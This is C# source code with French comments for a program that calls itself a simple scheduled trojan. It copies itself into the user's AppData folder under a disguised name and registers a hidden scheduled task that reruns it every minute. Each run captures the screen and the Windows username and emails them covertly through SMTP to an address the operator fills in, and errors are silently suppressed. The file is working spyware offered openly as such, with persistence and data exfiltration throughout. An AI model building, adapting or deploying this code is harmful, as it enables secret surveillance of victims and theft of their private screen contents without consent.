/*
 * TROJAN SIMPLE PLANIFIE :
 * A l'exécution, si l'utilisateur a les droits, ajoute l'exécution automatique toutes les minutes du programme pour prendre une capture de l'écran, 
 * récupèrer le nom de l'utilisateur et envoyer le tout par email
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ScheduldedSimpleTrojan
{
    class Program
    {
        static void Main(string[] args)
        {
            // Pour masquer la fenêtre Console, changer le type de sortie dans les propriétés de Application console à Application windows

            // Installation du virus et planification toutes les minutes (1er lancement puis vérif)
            Install();

            // Prise de la capture d'écran et envoi de l'email
            SendEmail();
        }

        private static void Install()
        {
            // Vérification que le virus est bien copié en local
            string virusFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Config");
            string virusFilePath = Path.Combine(virusFolderPath, "device.exe");
            if (!File.Exists(virusFilePath))
            {
                if (!Directory.Exists(virusFolderPath))
                {
                    Directory.CreateDirectory(virusFolderPath);
                }
                File.Copy(Application.ExecutablePath, virusFilePath);
            }

            // Vérification que l'éxecution du virus est bien planifié
            int exitCode = LaunchProcess("schtasks.exe", "/Query /TN _DeviceChecks");
            if(exitCode != 0)
            {
                LaunchProcess("schtasks.exe", $"/Create /SC minute /TN _DeviceChecks /TR \"{virusFilePath}\" /F");
                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "schtasks.exe";
                startInfo.Arguments = "/Query /TN DeviceChecks";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
        }

        private static int LaunchProcess(string a_process, string a_args)
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = a_process;
            startInfo.Arguments = a_args;
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
            return process.ExitCode;
        }

        private static Bitmap GetBitmapOfScreenshot()
        {
            Rectangle screenSize = Screen.PrimaryScreen.Bounds; // Taille de l'écran principal
            Bitmap bitmap = new Bitmap(screenSize.Width, screenSize.Height, PixelFormat.Format24bppRgb); // Bitmap couleur 24bits défini avec la taille de l'écran
            Graphics g = Graphics.FromImage(bitmap); // Récupération de l'objet Graphics
            g.CopyFromScreen(screenSize.Left, screenSize.Top, 0, 0, screenSize.Size); // Capture d'écran
            return bitmap;
        }

        private static void SendEmail()
        {
            SmtpClient smtpClient = null;
            string temporaryFilePath = Path.Combine(Path.GetTempPath(), "sc_" + DateTime.Now.ToString("ddMMyyyy_HHMMss") + ".png"); // Chemin temporaire de la capture d'écran
            string sourceEmail = "email_sender_adress_here";
            string sourcePassword = "password_here";
            string targerEmail = "email_destination_adress_here";
            try
            {
                // Capture d'écran
                Bitmap bitmap = GetBitmapOfScreenshot(); // Capture d'écran
                bitmap.Save(temporaryFilePath, ImageFormat.Png); // Sauvegarde capture d'écran
                bitmap.Dispose();

                // Récupération Username
                string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString();

                // Construction de l'email
                Attachment screenshot = new Attachment(temporaryFilePath);
                MailMessage mailMessage = new MailMessage()
                {
                    From = new MailAddress(sourceEmail),
                    Subject = "Capture ordi",
                    Body = $"Capture de l'ordinateur {username}",
                    IsBodyHtml = false
                };
                mailMessage.To.Add(targerEmail);
                mailMessage.Attachments.Add(screenshot);

                smtpClient = new SmtpClient("smtp_server_adress_here")
                {
                    Port = 587,
                    EnableSsl = true,
                    Credentials = new NetworkCredential(sourceEmail, sourcePassword)
                };
                smtpClient.Send(mailMessage);
                screenshot.Dispose();
                smtpClient.Dispose();
                File.Delete(temporaryFilePath);
            }
            catch (Exception)
            {
                // Echec...tant pis...
            }
            finally
            {
                if (smtpClient != null)
                {
                    smtpClient.Dispose();
                }
            }
        }

    }
}
